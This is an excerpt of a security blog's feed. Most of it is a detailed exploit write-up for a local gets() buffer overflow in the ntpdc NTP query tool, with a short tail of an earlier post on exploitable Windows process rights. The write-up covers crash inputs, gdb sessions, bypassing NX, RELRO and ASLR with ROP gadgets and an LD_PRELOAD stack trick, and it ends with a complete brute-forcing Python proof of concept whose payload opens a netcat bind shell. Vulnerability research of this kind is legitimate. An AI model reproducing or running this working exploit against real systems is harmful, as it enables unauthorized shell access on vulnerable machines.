creativity.</p>

<p>Similarly, processes have a specific subset of rights that are directly
exploitable:</p>

<p><code>
PROCESS_ALL_ACCESS
PROCESS_CREATE_PROCESS
PROCESS_CREATE_THREAD
PROCESS_DUP_HANDLE
PROCESS_VM_WRITE
</code></p>

<p>Barring these, more creativity is required.</p>

<h2>References</h2>

<p>[0]<a href="https://googleprojectzero.blogspot.com/2016/03/exploiting-leaked-thread-handle.html">https://googleprojectzero.blogspot.com/2016/03/exploiting-leaked-thread-handle.html</a> <br/>
[1]<a href="https://googleprojectzero.blogspot.com/2018/05/bypassing-mitigations-by-attacking-jit.html">https://googleprojectzero.blogspot.com/2018/05/bypassing-mitigations-by-attacking-jit.html</a> <br/>
[2]<a href="https://d4stiny.github.io/Local-Privilege-Escalation-on-most-Dell-computers/">https://d4stiny.github.io/Local-Privilege-Escalation-on-most-Dell-computers/</a> <br/>
[3]<a href="https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights">https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights</a> <br/>
[4]<a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext">https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext</a> <br/>
[5]<a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext">https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext</a> <br/>
[6]<a href="http://blog.txipinet.com/2007/04/05/69-a-paradox-writing-to-another-process-without-openning-it-nor-actually-writing-to-it/">http://blog.txipinet.com/2007/04/05/69-a-paradox-writing-to-another-process-without-openning-it-nor-actually-writing-to-it/</a> <br/>
[7]<a href="https://tyranidslair.blogspot.com/2017/08/the-art-of-becoming-trustedinstaller.html">https://tyranidslair.blogspot.com/2017/08/the-art-of-becoming-trustedinstaller.html</a> <br/>
[8]<a href="https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FThread%2FNtImpersonateThread.html">https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FThread%2FNtImpersonateThread.html</a> <br/>
[9]<a href="https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/blob/master/NtApiDotNet/NtThreadNative.cs#L51">https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/blob/master/NtApiDotNet/NtThreadNative.cs#L51</a> <br/>
[10]<a href="https://github.com/SafeBreach-Labs/pinjectra">https://github.com/SafeBreach-Labs/pinjectra</a> <br/>
[11]<a href="https://gist.github.com/hatRiot/aa77f007601be75684b95fe7ba978079">https://gist.github.com/hatRiot/aa77f007601be75684b95fe7ba978079</a> <br/>
[12]<a href="http://www.hexacorn.com/blog/category/code-injection/">http://www.hexacorn.com/blog/category/code-injection/</a> <br/>
[13]<a href="http://hatriot.github.io/blog/2019/08/12/code-execution-via-fiber-local-storage">http://hatriot.github.io/blog/2019/08/12/code-execution-via-fiber-local-storage</a> <br/>
[14]<a href="http://www.nynaeve.net/?p=180">http://www.nynaeve.net/?p=180</a> <br/>
[15]<a href="https://github.com/processhacker/processhacker/blob/master/phnt/include/ntpsapi.h#L98">https://github.com/processhacker/processhacker/blob/master/phnt/include/ntpsapi.h#L98</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[ntpdc local buffer overflow]]></title>
    <link href="http://hatRiot.github.io/blog/2015/01/06/ntpdc-exploit/"/>
    <updated>2015-01-06T13:10:04-08:00</updated>
    <id>http://hatRiot.github.io/blog/2015/01/06/ntpdc-exploit</id>
    <content type="html"><![CDATA[<p>Alejandro Hdez (@nitr0usmx) recently <a href="https://twitter.com/nitr0usmx/status/550372148448333825">tweeted</a> about a trivial buffer overflow in ntpdc, a deprecated NTP query tool still available and packaged with any NTP install.  He posted a screenshot of the crash as the result of a large buffer passed into a vulnerable <code>gets</code> call.  After digging into it a bit, I decided it&rsquo;d be a fun exploit to write, and it was.  There are a few quarks to it that make it of particular interest, of which I&rsquo;ve detailed below.</p>

<p>As noted, the bug is the result of a vulnerable <code>gets</code>, which can be crashed with the following:</p>

<p><code>
$ python -c 'print "A"*600' | ntpdc
***Command `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' unknown
Segmentation fault
</code></p>

<p>Loading into gdb on an x86 Debian 7 system:</p>

<p><code>
gdb-peda$ i r eax edx esi
eax            0x41414141   0x41414141
edx            0x41414141   0x41414141
esi            0x41414141   0x41414141
gdb-peda$ x/i $eip
=&gt; 0xb7fa1d76 &lt;el_gets+22&gt;: mov    eax,DWORD PTR [esi+0x14]
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : ENABLED
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
</code></p>

<p>Notice the <code>checksec</code> results of the binary, now compare this to a snippet of the <code>paxtest</code> output:</p>

<p>```
Mode: Blackhat
Linux deb7-32 3.2.0-4-486 #1 Debian 3.2.63-2+deb7u2 i686 GNU/Linux</p>

<p>Executable anonymous mapping             : Vulnerable
Executable bss                           : Vulnerable
Executable data                          : Vulnerable
Executable heap                          : Vulnerable
Executable stack                         : Vulnerable
Executable shared library bss            : Vulnerable
Executable shared library data           : Vulnerable
```</p>

<p>And the result of Debian&rsquo;s recommended <code>hardening-check</code>:</p>

<p><code>
$ hardening-check /usr/bin/ntpdc
/usr/bin/ntpdc:
 Position Independent Executable: no, normal executable!
 Stack protected: yes
 Fortify Source functions: yes (some protected functions found)
 Read-only relocations: yes
 Immediate binding: no, not found!
</code></p>

<p>Interestingly enough, I discovered this oddity after I had gained code execution in a place I shouldn&rsquo;t have.  We&rsquo;re also running with ASLR enabled:</p>

<p><code>
$ cat /proc/sys/kernel/randomize_va_space
2
</code></p>

<p>I&rsquo;ll explain why the above is interesting in a moment.</p>

<p>So in our current state, we control three registers and an instruction dereferencing <code>ESI+0x14</code>.  If we take a look just a few instructions ahead, we see the following:</p>

<p><code>
gdb-peda$ x/8i $eip
=&gt; 0xb7fa1d76 &lt;el_gets+22&gt;: mov    eax,DWORD PTR [esi+0x14] ; deref ESI+0x14 and move into EAX
   0xb7fa1d79 &lt;el_gets+25&gt;: test   al,0x2                   ; test lower byte against 0x2
   0xb7fa1d7b &lt;el_gets+27&gt;: je     0xb7fa1df8 &lt;el_gets+152&gt; ; jump if ZF == 1
   0xb7fa1d7d &lt;el_gets+29&gt;: mov    ebp,DWORD PTR [esi+0x2c] ; doesnt matter
   0xb7fa1d80 &lt;el_gets+32&gt;: mov    DWORD PTR [esp+0x4],ebp  ; doesnt matter
   0xb7fa1d84 &lt;el_gets+36&gt;: mov    DWORD PTR [esp],esi      ; doesnt matter
   0xb7fa1d87 &lt;el_gets+39&gt;: call   DWORD PTR [esi+0x318]    ; call a controllable pointer
</code></p>

<p>I&rsquo;ve detailed the instructions above, but essentially we&rsquo;ve got a free CALL.  In order to reach this, we need an ESI value that at +0x14 will set ZF == 0 (to bypass the test/je) and at +0x318 will point into controlled data.</p>

<p>Naturally, we should figure out where our payload junk is and go from there.</p>

<p><code>
gdb-peda$ searchmem 0x41414141
Searching for '0x41414141' in: None ranges
Found 751 results, display max 256 items:
 ntpdc : 0x806ab00 ('A' &lt;repeats 200 times&gt;...)
gdb-peda$ maintenance i sections
[snip]
0x806a400-&gt;0x806edc8 at 0x00021400: .bss ALLOC
gdb-peda$ vmmap
Start      End        Perm  Name
0x08048000 0x08068000 r-xp  /usr/bin/ntpdc
0x08068000 0x08069000 r--p  /usr/bin/ntpdc
0x08069000 0x0806b000 rw-p  /usr/bin/ntpdc
[snip]
</code></p>

<p>Our payload is copied into BSS, which is beneficial as this will remain unaffected by ASLR, further bonus points because our binary wasn&rsquo;t compiled with PIE.  We now need to move back -0x318 and look for a value that will set ZF == 0 with the <code>test al,0x2</code> instruction.  A value at <code>0x806a9e1</code> satisfies both the +0x14 and +0x318 requirements:</p>

<p><code>
gdb-peda$ x/wx 0x806a9cd+0x14
0x806a9e1:  0x6c61636f
gdb-peda$ x/wx 0x806a9cd+0x318
0x806ace5:  0x41414141
</code></p>

<p>After figuring out the offset in the payload for ESI, we just need to plug <code>0x806a9cd</code> in and hopefully we&rsquo;ll have EIP:</p>

<p>```
$ python -c &lsquo;print &ldquo;A&rdquo;<em>485 + &ldquo;C&rdquo;</em>4 + &ldquo;A&rdquo;<em>79 + &ldquo;\xcd\xa9\x06\x08&rdquo; + &ldquo;C&rdquo;</em>600&rsquo; > crash.info
$ gdb -q /usr/bin/ntpdc
$ r &lt; crash.info</p>

<p>Program received signal SIGSEGV, Segmentation fault.
[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;registers&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;]
EAX: 0x6c61636f (&lsquo;ocal&rsquo;)
EBX: 0xb7fabff4 &mdash;> 0x1fe40
ECX: 0xb7dc13c0 &mdash;> 0x0
EDX: 0x43434343 (&lsquo;CCCC&rsquo;)
ESI: 0x806a9cd &mdash;> 0x0
EDI: 0x0
EBP: 0x0
ESP: 0xbffff3cc &mdash;> 0xb7fa1d8d (&lt;el_gets+45>:   cmp    eax,0x1)
EIP: 0x43434343 (&lsquo;CCCC&rsquo;)
EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-code&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;]
Invalid $PC address: 0x43434343
[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;stack&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;]
0000| 0xbffff3cc &mdash;> 0xb7fa1d8d (&lt;el_gets+45>:  cmp    eax,0x1)
0004| 0xbffff3d0 &mdash;> 0x806a9cd &mdash;> 0x0
0008| 0xbffff3d4 &mdash;> 0x0
0012| 0xbffff3d8 &mdash;> 0x8069108 &mdash;> 0xb7d7a4d0 (push   ebx)
0016| 0xbffff3dc &mdash;> 0x0
0020| 0xbffff3e0 &mdash;> 0xb7c677f4 &mdash;> 0x1cce
0024| 0xbffff3e4 &mdash;> 0x807b6f8 (&lsquo;A&rsquo; <repeats 200 times>&hellip;)
0028| 0xbffff3e8 &mdash;> 0x807d3b0 (&lsquo;A&rsquo; <repeats 200 times>&hellip;)
[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x43434343 in ?? ()
```</p>

<p>Now that we&rsquo;ve got EIP, it&rsquo;s a simple matter of stack pivoting to execute a ROP payload.  Let&rsquo;s figure out where that <code>"C"*600</code> lands in memory and redirect EIP there:</p>

<p><code>
gdb-peda$ searchmem 0x43434343
Searching for '0x43434343' in: None ranges
Found 755 results, display max 256 items:
 ntpdc : 0x806ace5 ("CCCC", 'A' &lt;repeats 79 times&gt;, "ͩ\006\b", 'C' &lt;repeats 113 times&gt;...)
 ntpdc : 0x806ad3c ('C' &lt;repeats 200 times&gt;...)
 [snip]
</code></p>

<p>And we&rsquo;ll fill it with <code>\xcc</code> to ensure we&rsquo;re there (theoretically triggering NX):</p>

<p><code>
$ python -c 'print "A"*485 + "\x3c\xad\x06\x08" + "A"*79 + "\xcd\xa9\x06\x08" + "\xcc"*600' &gt; crash.info
$ gdb -q /usr/bin/ntpdc
Reading symbols from /usr/bin/ntpdc...(no debugging symbols found)...done.
gdb-peda$ r &lt; crash.info
[snip]
Program received signal SIGTRAP, Trace/breakpoint trap.
[----------------------------------registers-----------------------------------]
EAX: 0x6c61636f ('ocal')
EBX: 0xb7fabff4 --&gt; 0x1fe40
ECX: 0xb7dc13c0 --&gt; 0x0
EDX: 0xcccccccc
ESI: 0x806a9cd --&gt; 0x0
EDI: 0x0
EBP: 0x0
ESP: 0xbffff3ec --&gt; 0xb7fa1d8d (&lt;el_gets+45&gt;:   cmp    eax,0x1)
EIP: 0x806ad3d --&gt; 0xcccccccc
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x806ad38:   int    0xa9
   0x806ad3a:   push   es
   0x806ad3b:   or     ah,cl
=&gt; 0x806ad3d:   int3   
   0x806ad3e:   int3   
   0x806ad3f:   int3   
   0x806ad40:   int3   
   0x806ad41:   int3
[------------------------------------stack-------------------------------------]
0000| 0xbffff3ec --&gt; 0xb7fa1d8d (&lt;el_gets+45&gt;:  cmp    eax,0x1)
0004| 0xbffff3f0 --&gt; 0x806a9cd --&gt; 0x0
0008| 0xbffff3f4 --&gt; 0x0
0012| 0xbffff3f8 --&gt; 0x8069108 --&gt; 0xb7d7a4d0 (push   ebx)
0016| 0xbffff3fc --&gt; 0x0
0020| 0xbffff400 --&gt; 0xb7c677f4 --&gt; 0x1cce
0024| 0xbffff404 --&gt; 0x807b9d0 ('A' &lt;repeats 200 times&gt;...)
0028| 0xbffff408 --&gt; 0x807d688 ('A' &lt;repeats 200 times&gt;...)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGTRAP
0x0806ad3d in ?? ()
gdb-peda$
</code></p>

<p>Er, what?  It appears to be executing code in BSS! Recall the output of paxtest/checksec/hardening-check from earlier, NX was clearly enabled.  This took me a few hours to figure out, but it ultimately came down to Debian not distributing x86 images with PAE, or Physical Address Extension.  PAE is a kernel feature that allows 32-bit CPU&rsquo;s to access physical page tables and doubling each entry in the page table and page directory.  This third level of paging and increased entry size is required for NX on x86 architectures because NX adds a single &lsquo;dont execute&rsquo; bit to the page table.  You can read more about PAE <a href="http://en.wikipedia.org/wiki/Physical_Address_Extension">here</a>, and the original NX patch <a href="http://lwn.net/Articles/87808/">here</a>.</p>

<p>This flag can be tested for with a simple grep of <code>/proc/cpuinfo</code>; on a fresh install of Debian 7, a grep for PAE will turn up empty, but on something with support, such as Ubuntu, you&rsquo;ll get the flag back.</p>

<p>Because I had come this far already, I figured I might as well get the exploit working.  At this point it was simple, anyway:</p>

<p><code>
$ python -c 'print "A"*485 + "\x3c\xad\x06\x08" + "A"*79 + "\xcd\xa9\x06\x08" + "\x90"*4 + "\x68\xec\xf7\xff\xbf\x68\x70\xe2\xc8\xb7\x68\x30\xac\xc9\xb7\xc3"' &gt; input2.file
$ gdb -q /usr/bin/ntpdc
Reading symbols from /usr/bin/ntpdc...(no debugging symbols found)...done.
gdb-peda$ r &lt; input.file
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/i386-linux-gnu/i686/cmov/libthread_db.so.1".
***Command `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&lt;�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAͩ����h����hp�ȷh0�ɷ�' unknown
[New process 4396]
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/i386-linux-gnu/i686/cmov/libthread_db.so.1".
process 4396 is executing new program: /bin/dash
[New process 4397]
process 4397 is executing new program: /bin/nc.traditional
</code></p>

<p>This uses a simple <code>system</code> payload with hard-coded addresses, because at this point it&rsquo;s an old-school, CTF-style exploit.  And it works.  With this trivial PoC working, I decided to check another box I had to verify this is a common distribution method.  An Ubuntu VM said otherwise:</p>

<p><code>
$ uname -a
Linux bryan-VirtualBox 3.2.0-74-generic #109-Ubuntu SMP Tue Dec 9 16:47:54 UTC 2014 i686 i686 i386 GNU/Linux
$ ./checksec.sh --file /usr/bin/ntpdc
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   /usr/bin/ntpdc
$ cat /proc/sys/kernel/randomize_va_space
2
</code></p>

<p>Quite a different story.  We need to bypass full RELRO (no GOT overwrites), PIE+ASLR, NX, SSP, and ASCII armor.  In our current state, things are looking pretty grim.  As an aside, it&rsquo;s important to remember that because this is a local exploit, the attacker is assumed to have limited control over the system.  Ergo, an attacker may inspect and modify the system in the same manner a limited user could.  This becomes important with a few techniques we&rsquo;re going to use moving forward.</p>

<p>Our first priority is stack pivoting; we won&rsquo;t be able to ROP to victory without control over the stack.  There are a few options for this, but the easiest option is likely going to be an <code>ADD ESP, ?</code> gadget.  The problem with this being that we need to have some sort of control over the stack or be able to modify ESP somewhere into BSS that we control.  Looking at the output of <code>ropgadget</code>, we&rsquo;ve got 36 options, almost all of which are of the form <code>ADD ESP, ?</code>.</p>

<p>After looking through the list, I determined that none of the values led to control over the stack; in fact, nothing I injected landed on the stack.  I did note, however, the following:</p>

<p><code>
gdb-peda$ x/6i 0x800143e0
   0x800143e0: add    esp,0x256c
   0x800143e6: pop    ebx
   0x800143e7: pop    esi
   0x800143e8: pop    edi
   0x800143e9: pop    ebp
   0x800143ea: ret
gdb-peda$ x/30s $esp+0x256c
0xbffff3a4:  "-1420310755.557158-104120677"
0xbffff3c1:  "WINDOWID=69206020"
0xbffff3d3:  "GNOME_KEYRING_CONTROL=/tmp/keyring-iBX3uM"
0xbffff3fd:  "GTK_MODULES=canberra-gtk-module:canberra-gtk-module"
</code></p>

<p>These are environmental variables passed into the application and located on the program stack.  Using the ROP gadget <code>ADD ESP, 0x256c</code>, followed by a series of register POPs, we could land here.  Controlling this is easy with the help of LD_PRELOAD, a neat trick <a href="http://vulnfactory.org/blog/2010/04/08/controlling-uninitialized-memory-with-ld_preload/">documented</a> by Dan Rosenberg in 2010.  By exporting LD_PRELOAD, we can control uninitialized data located on the stack, as follows:</p>

<p><code>
$ export LD_PRELOAD=`python -c 'print "A"*10000'`
$ gdb -q /usr/bin/ntpdc
gdb-peda$ r &lt; input.file
[..snip..]
gdb-peda$ x/10wx $esp+0x256c
0xbfffedc8: 0x41414141  0x41414141  0x41414141  0x41414141
0xbfffedd8: 0x41414141  0x41414141  0x41414141  0x41414141
0xbfffede8: 0x41414141  0x41414141
gdb-peda$
</code></p>

<p>Using some pattern_create/offset magic, we can find the offset in our LD_PRELOAD string and take control over EIP and the stack:</p>

<p><code>
$ export LD_PRELOAD=`python -c 'print "A"*8490 + "AAAA" + "BBBB"'`
$ python -c "print 'A'*485 + '\xe0\x43\x01\x80' + 'A'*79 + '\x8d\x67\x02\x80' + 'B'*600" &gt; input.file
$ gdb -q /usr/bin/ntpdc
gdb-peda$ r &lt; input.file
Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x6c61636f ('ocal')
EBX: 0x41414141 ('AAAA')
ECX: 0x13560
EDX: 0x42424242 ('BBBB')
ESI: 0x41414141 ('AAAA')
EDI: 0x41414141 ('AAAA')
EBP: 0x41414141 ('AAAA')
ESP: 0xbffff3bc ("BBBB")
EIP: 0x41414141 ('AAAA')
EFLAGS: 0x10292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
[------------------------------------stack-------------------------------------]
0000| 0xbffff3bc ("BBBB")
0004| 0xbffff3c0 --&gt; 0x4e495700 ('')
0008| 0xbffff3c4 ("DOWID=69206020")
0012| 0xbffff3c8 ("D=69206020")
0016| 0xbffff3cc ("206020")
0020| 0xbffff3d0 --&gt; 0x47003032 ('20')
0024| 0xbffff3d4 ("NOME_KEYRING_CONTROL=/tmp/keyring-iBX3uM")
0028| 0xbffff3d8 ("_KEYRING_CONTROL=/tmp/keyring-iBX3uM")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414141 in ?? ()
</code></p>

<p>This gives us EIP, control over the stack, and control over a decent number of registers; however, the LD_PRELOAD trick is extremely sensitive to stack shifting which represents a pretty big problem for exploit portability.  For now, I&rsquo;m going to forget about it; chances are we could brute force the offset, if necessary, or simply invoke the application with <code>env -i</code>.</p>

<p>From here, we need to figure out a ROP payload.  The easiest payload I can think of is a simple ret2libc.  Unfortunately, ASCII armor null bytes all of them:</p>

<p>```
gdb-peda$ vmmap</p>

<p>0x00327000 0x004cb000 r-xp /lib/i386-linux-gnu/libc-2.15.so
0x004cb000 0x004cd000 r&mdash;p /lib/i386-linux-gnu/libc-2.15.so
0x004cd000 0x004ce000 rw-p /lib/i386-linux-gnu/libc-2.15.so
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0x366060 <system>
gdb-peda$
```</p>

<p>One idea I had was to simply construct the address in memory, then call it.  Using <a href="http://github.com/JonathanSalwan/ROPgadget">ROPgadget</a>, I hunted for ADD/SUB instructions that modified any registers we controlled.  Eventually, I discovered this gem:</p>

<p><code>
0x800138f2: add edi, esi; ret 0;
0x80022073: call edi
</code></p>

<p>Using the above, we could pop controlled, non-null values into EDI/ESI, that when added equaled <code>0x366060 &lt;system&gt;</code>.  Many values will work, but I chose <code>0xeeffffff + 0x11366061</code>:</p>

<p><code>
EAX: 0x6c61636f ('ocal')
EBX: 0x41414141 ('AAAA')
ECX: 0x12f00
EDX: 0x42424242 ('BBBB')
ESI: 0xeeffffff
EDI: 0x11366061
EBP: 0x41414141 ('AAAA')
ESP: 0xbfffefb8 --&gt; 0x800138f2 (add    edi,esi)
EIP: 0x800143ea (ret)
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x800143e7: pop    esi
   0x800143e8: pop    edi
   0x800143e9: pop    ebp
=&gt; 0x800143ea: ret    
   0x800143eb: nop
   0x800143ec: lea    esi,[esi+eiz*1+0x0]
   0x800143f0: mov    DWORD PTR [esp],ebp
   0x800143f3: call   0x80018d20
[------------------------------------stack-------------------------------------]
0000| 0xbfffefb8 --&gt; 0x800138f2 (add    edi,esi)
0004| 0xbfffefbc --&gt; 0x80022073 --&gt; 0xd7ff
0008| 0xbfffefc0 ('C' &lt;repeats 200 times&gt;...)
0012| 0xbfffefc4 ('C' &lt;repeats 200 times&gt;...)
0016| 0xbfffefc8 ('C' &lt;repeats 200 times&gt;...)
0020| 0xbfffefcc ('C' &lt;repeats 200 times&gt;...)
0024| 0xbfffefd0 ('C' &lt;repeats 200 times&gt;...)
0028| 0xbfffefd4 ('C' &lt;repeats 200 times&gt;...)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x800143ea in ?? ()
</code></p>

<p>As shown above, we&rsquo;ve got our two values in EDI/ESI and are returning to our <code>ADD EDI, ESI</code> gadget.  Once this completes, we return to our <code>CALL EDI</code> gadget, which will jump into <code>system</code>:</p>

<p><code>
EDI: 0x366060 (&lt;system&gt;:   sub    esp,0x1c)
EBP: 0x41414141 ('AAAA')
ESP: 0xbfffefc0 --&gt; 0xbffff60d ("/bin/nc -lp 5544 -e /bin/sh")
EIP: 0x80022073 --&gt; 0xd7ff
EFLAGS: 0x217 (CARRY PARITY ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
=&gt; 0x80022073: call   edi
</code></p>

<p>Recall the format of a ret2libc: <code>[system() address | exit() | shell command]</code>; therefore, we need to stick a bogus <code>exit</code> address (in my case, junk) as well as the address of a command.  Also remember, however, that <code>CALL EDI</code> is essentially a macro for <code>PUSH EIP+2 ; JMP EDI</code>.  This means that our stack will be tainted with the address @ EIP+2.  Thanks to this, we don&rsquo;t really need to add an exit address, as one will be added for us.  There are, unfortunately, no <code>JMP EDI</code> gadgets in the binary, so we&rsquo;re stuck with a messy exit.</p>

<p>This culminates in:</p>

<p><code>
$ export LD_PRELOAD=`python -c 'print "A"*8472 + "\xff\xff\xff\xee" + "\x61\x60\x36\x11" + "AAAA" + "\xf2\x38\x01\x80" + "\x73\x20\x02\x80" + "\x0d\xf6\xff\xbf" + "C"*1492'`
$ gdb -q /usr/bin/ntpdc
gdb-peda$ r &lt; input.file
[snip all the LD_PRELOAD crap]
[New process 31184]
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/i386-linux-gnu/libthread_db.so.1".
process 31184 is executing new program: /bin/dash
[New process 31185]
process 31185 is executing new program: /bin/nc.traditional
</code></p>

<p>Success!  Though this is a very dirty hack, and makes no claim of portability, it works.  As noted previously, we can brute force the image base and stack offsets, though we can also execute the binary with an empty environment and no stack tampering with <code>env -i</code>, giving us a much higher chance of hitting our mark.</p>

<p>Overall, this was quite a bit of fun.  Although ASLR/PIE still poses an issue, this is a local bug that brute forcing and a little investigation can&rsquo;t take care of.  NX/RELRO/Canary/SSP/ASCII Armor have all been successfully neutralized.  I hacked up a PoC that <em>should</em> work on Ubuntu boxes as configured, but it brute forces offsets.  Test runs show it can take up to 2 hours to successfully pop a box.  Full code can be found below.</p>

<p>```
from os import system, environ
from struct import pack
import sys</p>

<p>#</p>

<h1>ntpdc 4.2.6p3 bof</h1>

<h1>@dronesec</h1>

<h1>tested on x86 Ubuntu 12.04.5 LTS</h1>

<p>#</p>

<p>IMAGE_BASE = 0x80000000
LD_INITIAL_OFFSET = 8900
LD_TAIL_OFFSET = 1400</p>

<p>sploit = &ldquo;\x41&rdquo; * 485        # junk
sploit += pack(&ldquo;&lt;I&rdquo;, IMAGE_BASE + 0x000143e0) # eip
sploit += &ldquo;\x41&rdquo; * 79        # junk
sploit += pack(&ldquo;&lt;I&rdquo;, IMAGE_BASE + 0x0002678d) # location -0x14/-0x318 from shellcode</p>

<p>ld_pl = &ldquo;&rdquo;
ld_pl += pack(&ldquo;&lt;I&rdquo;, 0xeeffffff) # ESI
ld_pl += pack(&ldquo;&lt;I&rdquo;, 0x11366061) # EDI
ld_pl += pack(&ldquo;&lt;I&rdquo;, 0x41414141) # EBP
ld_pl += pack(&ldquo;&lt;I&rdquo;, IMAGE_BASE + 0x000138f2) # ADD EDI, ESI; RET
ld_pl += pack(&ldquo;&lt;I&rdquo;, IMAGE_BASE + 0x00022073) # CALL EDI
ld_pl += pack(&ldquo;&lt;I&rdquo;, 0xbffff60d) # payload addr based on empty env; probably wrong</p>

<p>environ[&ldquo;EGG&rdquo;] = &ldquo;/bin/nc -lp 5544 -e /bin/sh&rdquo;</p>

<p>for idx in xrange(200):</p>

<pre><code>for inc in xrange(200):

    ld_pl = ld_pl + "\x41" * (LD_INITIAL_OFFSET + idx)
    ld_pl += "\x43" * (LD_INITIAL_OFFSET + inc)

    environ["LD_PRELOAD"] = ld_pl
    system("echo %s | ntpdc 2&gt;&amp;1" % sploit)
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
</feed>
